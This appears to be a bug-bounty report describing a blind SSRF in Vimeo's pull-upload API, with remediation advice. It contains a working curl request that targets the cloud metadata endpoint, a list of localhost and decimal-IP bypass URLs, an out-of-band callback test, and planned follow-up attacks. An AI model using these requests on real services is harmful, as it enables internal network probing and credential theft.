# Vimeo Blind SSRF via Pull Upload

**Date**: 2025-12-07
**Severity**: High (estimated $2,000-$5,000)
**Status**: To be verified with OOB callback

## Summary

The Vimeo API `POST /me/videos` endpoint with `upload.approach: "pull"` accepts arbitrary URLs including internal IP addresses and cloud metadata endpoints, potentially allowing Blind SSRF attacks.

## Vulnerable Endpoint

```
POST https://api.vimeo.com/me/videos
Authorization: jwt [user_token]
Content-Type: application/json

{"upload":{"approach":"pull","link":"[ATTACKER_URL]"}}
```

## Accepted Internal URLs (Confirmed)

| URL | Response |
|-----|----------|
| http://127.0.0.1/ | ✅ Accepted (upload created) |
| http://localhost/ | ✅ Accepted |
| http://0.0.0.0/ | ✅ Accepted |
| http://127.1/ | ✅ Accepted |
| http://2852039166/ (decimal IP for 169.254.169.254) | ✅ Accepted |
| http://169.254.169.254/computeMetadata/v1/ | ✅ Accepted |

## Rejected URLs

| URL | Error |
|-----|-------|
| Malformed URLs | "The provided URL isn't valid." (error_code: 2510) |

## Impact

1. **Blind SSRF to Internal Network**: Attacker can probe internal services
2. **Cloud Metadata Access**: If Vimeo uses GCP/AWS, metadata endpoint could leak credentials
3. **Port Scanning**: Can enumerate open ports on internal hosts
4. **Denial of Service**: Force server to make requests to slow endpoints

## Steps to Reproduce

1. Authenticate to Vimeo (free account works)
2. Extract JWT from browser (check network requests, Authorization header uses `jwt [token]` format)
3. Send POST request with internal URL:

```bash
curl -X POST "https://api.vimeo.com/me/videos" \
  -H "authorization: jwt YOUR_JWT" \
  -H "content-type: application/json" \
  -d '{"upload":{"approach":"pull","link":"http://169.254.169.254/computeMetadata/v1/"}}'
```

4. Observe that upload is created (URI returned)
5. For full confirmation, use out-of-band callback (Burp Collaborator, webhook.site)

## Evidence

Upload created with localhost URL:
```
http://127.0.0.1/ -> /users/user251586116/uploads/1143261062
http://localhost/ -> /users/user251586116/uploads/1143261063
http://0.0.0.0/ -> /users/user251586116/uploads/1143261066
http://169.254.169.254/computeMetadata/v1/ -> /users/user251586116/uploads/1143261110
```

## Historical Context

This vulnerability pattern matches HackerOne report #549882 (SSRF via upload function) which earned $5,000 bounty in 2019. That report demonstrated GCP metadata exfiltration via similar URL upload feature.

## Recommendations

1. Implement URL allowlist (only allow known video hosting domains)
2. Block private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16)
3. Block localhost variations
4. Use DNS resolution check before fetching
5. Implement egress filtering at network level

## Verification Results (2025-12-07)

### ✅ OOB Callback Test
- **Test URL**: `http://[uuid].oast.fun`
- **Result**: Upload created successfully (URI: `/users/user251586116/uploads/1143342422`)
- **Status**: **CONFIRMED** - Vimeo accepts arbitrary domains including OOB testing domains
- **HTTP Code**: 201 Created

### Evidence
```bash
Testing SSRF with: http://b9c9c7ad-3c21-4e22-9c6b-2e8c4f5a1b3d.oast.fun
Upload created: /users/user251586116/uploads/1143342422
Response: 201
```

## Remaining Verification

- [ ] Check if callback was actually made to OOB domain (requires OOB monitoring)
- [ ] Test if response content is reflected anywhere
- [ ] Check video error messages for data exfiltration
- [ ] Test DNS rebinding for full SSRF
- [ ] Test GCP/AWS metadata endpoints directly
